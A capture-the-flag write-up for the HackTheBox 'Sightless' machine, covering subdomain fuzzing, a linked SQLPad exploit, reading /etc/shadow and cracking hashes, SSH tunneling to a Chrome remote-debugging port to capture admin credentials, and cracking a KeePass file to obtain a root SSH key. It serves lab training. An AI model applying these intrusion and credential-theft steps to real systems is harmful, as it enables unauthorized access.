---
title: Sightless
date: 2025-01-03
description: Easy Linux machine focused on web enumeration, SQLPad SSTI exploitation, Docker escape awareness, credential recovery, Chrome remote debugging abuse, and KeePass extraction to obtain root SSH access.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```bash
21 → ftp (kicks us out)
22 → ssh
80 → http
```

## Subdomain Enumeration

```bash
ffuf -c -u http://sightless.htb/ -H "HOST: FUZZ.sightless.htb" -w /path/to/your/preferred/wordlist
```

Used these wordlists for enumeration:

```bash
/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
/usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
```

The lists were massive, so the search got narrowed down using `grep`.

Since the website hinted at a service called `sqlpad`, filtering with the letter `s` felt like the fastest route instead of throwing the whole dictionary at the target and aging another five years.

```bash
grep -i '^s' wordlist.txt > filtered_wordlist.txt
```

```bash
ffuf -c -u http://sightless.htb/ -H "HOST: FUZZ.sightless.htb" -w /path/to/your/preferred/wordlist -fc 301
```

Enumeration returned a `200` response for `sqlpad`.

Add the discovered subdomain to `/etc/hosts`:

```bash
10.10.11.32 sightless.htb sqlpad.sightless.htb
```

Navigate to:

```bash
http://sqlpad.sightless.htb
```

The panel exposed the version:

```bash
SQLPad 6.10.0
```

> Searching for public vulnerabilities led to:
> https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944


Read the `README.md` first before running the exploit. Going full send without reading docs is how people end up debugging their own mistakes for two hours.

# User

The exploit granted `root` access inside a container, but the hostname looked random instead of `sightless.htb`.

Checking `/etc/hosts` showed a `172.x.x.x` address range, strongly suggesting a Docker environment.

Inside `sqlpad.sqlite`, two users were identified:

```text
john@sightless.htb
admin@sightless.htb
```

Since the container shell already had elevated privileges, further enumeration was possible. Another user named `michael` appeared to be tied to the host environment.

Dumping `/etc/shadow` exposed Michael’s hash:

```text
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
```

The hash cracked to:

```text
insaneclownposse
```

SSH access as `michael` worked against the target host.

Verified the environment again through `/etc/hosts` to avoid getting baited into another container rabbit hole which revealed another subdomain:

```bash
admin.sightless.htb
```

Testing the endpoint:

```bash
curl admin.sightless.htb
```

The response returned a `302` redirect.

Tried forcing the host header:

```bash
curl -H 'Host: admin.sightless.htb' http://127.0.0.1/
```

No useful response.

Checking listening services with `netstat -antp` revealed an interesting localhost-bound HTTP service:

```text
127.0.0.1:8080          0.0.0.0:*               LISTEN
```

Querying it directly:

```bash
curl -H 'Host: admin.sightless.htb' http://127.0.0.1:8080
```

SSH port forwarding was cleaner, so the service got tunneled locally instead.

Forwarded `localhost:8080` from the target to the attacker machine, then added:

```bash
127.0.0.1          admin.sightless.htb
```

Browsing to:

```bash
http://127.0.0.1:8080
```

revealed a `Froxlor` login panel.

At this stage there were no credentials, so enumeration continued.

Downloaded and executed `pspy64` as `michael`.

Interesting process discovery:

```text
/home/john/automation/chromedriver --port=40287
```

The `--remote-debugging` flag immediately stood out. Somebody really left Chrome debugging enabled in production. Beautiful.

The port changes periodically, so recheck if needed.

Forwarded the `chromedriver` port locally:

```text
40287
```

Used `feroxbuster` against:

```bash
http://sightless.htb:40287/
```

The `/sessions` endpoint exposed a debugger address:

```text
localhost:33385
```

Forwarded that port as well.

# Root

SSH tunneling setup:

```bash
ssh -L 8080:127.0.0.1:8080 \
-L 40287:127.0.0.1:40287 \
-L 33385:127.0.0.1:33385 \
michael@sightless.htb
```

Opened:

```text
chrome://inspect/#devices
```

Then:

- Selected **Configure**
- Added `127.0.0.1:40287`
- Connected to the remote debugger
- Clicked **Inspect**

Inside DevTools:

- Right-clicked the columns
- Enabled the **Method** field
- Opened a POST request
- Checked the payload tab

Credentials recovered:

```text
admin : ForlorfroxAdmin
```

Logged into the `Froxlor` panel and confirmed the version:

```text
Froxlor 2.1.8
```

A public blind XSS advisory existed:

```text
https://github.com/froxlor/Froxlor/security/advisories/GHSA-x525-54hf-xr53
```

The exploit path did not work reliably here, so manual enumeration continued instead.

Inside the dashboard:

- One customer existed under the **Resources** section
- User identified as `john`
- Username: `web1`

Navigating through the user dashboard exposed FTP account management.

Since admin access was available, the FTP password for `web1` was reset.

The FTP service still rejected standard logins with:

```text
550 SSL/TLS required on the control channel
```

Used `lftp` instead:

```bash
lftp
```

```bash
set ftp:ssl-allow true
```

Certificate verification failed:

```text
Certificate verification: The certificate is NOT trusted
```

Disabled verification:

```bash
set ssl:verify-certificate false
```

Connected successfully:

```bash
lftp -u web1 sightless.htb
```

Browsing the directories exposed:

```text
Database.kdb
```

Extracted the KeePass hash:

```bash
keepass2john Database.kdb > dbhash.txt
```

Cracked it using `john`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt dbhash.txt
```

Recovered master password:

```text
bulldogs
```

Opened the database with:

```bash
keepassxc Database.kdb
```

Since it was a KeePass v1 database, the import option inside KeePassXC was required.

After extraction, the database contents were saved into a new file:

```text
password.kdbx
```

The stored root password failed, but the **Advanced** tab exposed an `id_rsa` private key.

Copied the key, applied proper permissions:

```bash
chmod 600 id_rsa
```

SSH access using the key granted a root shell.

Gained `root`
